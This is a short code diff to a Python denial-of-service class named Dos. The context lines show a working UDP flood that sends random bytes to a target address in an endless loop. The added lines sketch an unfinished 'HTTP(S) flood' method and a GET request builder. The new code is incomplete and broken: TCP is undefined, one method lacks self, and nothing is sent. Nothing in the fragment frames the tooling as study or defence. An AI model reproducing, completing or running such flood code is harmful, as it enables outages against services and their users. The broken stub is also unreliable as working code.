@@ -23,6 +23,15 @@ class Dos():
         bytes_to_send = random._urandom(self.udp_size_bytes)  # random bytes
         while True:
             sock.sendto(bytes_to_send, (self.target_ip, self.target_port))
+            
+    def http_flood(self):
+        """
+        HTTP(S) flood
+        """
+        sock = socket.socket(socket.AF_INET, TCP)
+    
+    def get_http_request():
+        header = b'GET / HTTP/1.1\r\nHost:www.example.com\r\n\r\n'
 
     def start_attack(self):
         """
